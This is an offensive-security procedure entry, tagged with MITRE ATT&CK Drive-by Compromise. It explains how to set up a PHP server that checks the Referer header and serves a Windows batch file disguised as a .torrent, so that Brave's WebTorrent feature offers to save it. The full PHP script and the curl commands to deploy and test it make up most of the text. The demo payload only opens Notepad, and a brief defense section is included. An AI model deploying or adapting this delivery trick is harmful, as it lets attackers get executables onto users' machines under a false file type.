---
tags:
  - php
  - header-manipulation
  - server-setup
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-04T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:46:32.004Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 1deea74b-f2cb-4a7b-a6a9-b0c591b40b2d
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Configure Malicious PHP Server for Header Manipulation

## Summary

This procedure sets up a PHP-based web server that conditionally serves Content-Disposition and Content-Type headers to mimic a torrent file when accessed from Brave browser, allowing the delivery of malicious batch content disguised as a harmless download.

## Description

The attack leverages PHP's ability to inspect the HTTP_REFERER header sent by Brave during WebTorrent interactions. If the Referer indicates Brave, the server sets torrent-specific headers (e.g., filename='PoC.torrent' and application/octet-stream) while serving executable batch content. Otherwise, it serves the file as a .bat. This tricks Brave's WebTorrent feature into prompting a 'Save .torrent file' option without validating the actual file content, enabling arbitrary file download and potential RCE upon execution. Prerequisites include a PHP-enabled web host (e.g., Apache with PHP module).

## Requirements

1. PHP-enabled web server (version 5.0+)
2. Domain or IP for hosting the malicious endpoint
3. Basic web development knowledge for script deployment

## Defense

Defensive measures and detection strategies:

- Disable WebTorrent in Brave browser settings
- Implement content validation on downloads beyond headers (e.g., browser extensions for file scanning)
- Monitor for anomalous Referer headers in server logs
- Educate users on verifying file contents before execution

## Objectives

1. Deploy server that detects browser-specific Referer
2. Serve manipulated headers with malicious payload
3. Enable disguised download for subsequent exploitation

## Instructions

### Step 1: Create the PHP Script

**Context**: Write a PHP file that checks the Referer and sets headers accordingly, then outputs the batch payload.

**Command** (PHP Script):
```php
<?php
$referer = $_SERVER['HTTP_REFERER'] ?? '';
if (strpos($referer, 'brave') !== false) {
    header('Content-Disposition: attachment; filename="PoC.torrent"');
    header('Content-Type: application/octet-stream');
} else {
    header('Content-Disposition: attachment; filename="malicious.bat"');
    header('Content-Type: application/x-msdownload');
}

// Payload: Simple RCE demo
echo "@echo off\r\nSTART C:\\Windows\\NOTEPAD.EXE";
?>
```

> This script inspects the Referer for 'brave', sets torrent headers if matched, and echoes the batch command to launch Notepad. Save as test-driver.php.

### Step 2: Deploy and Host the Script

**Context**: Upload the script to a web-accessible location and ensure PHP execution.

**Instructions**: Place the file in your web root (e.g., /var/www/html/) and access via HTTPS for realism. Test with curl:

```bash
curl -H "Referer: https://brave.com" -I https://your-server.com/test-driver.php
```

> Expected headers: Content-Disposition with PoC.torrent. Without Referer, it serves as .bat.

### Step 3: Verify Server Response

**Context**: Confirm conditional behavior.

**Instructions**: Use browser dev tools or curl to simulate requests.

```bash
curl https://your-server.com/test-driver.php --output poc.torrent
cat poc.torrent
```

> Output shows batch content. Rename to .bat and run to test execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]

## Tags

- php
- header-manipulation
- server-setup
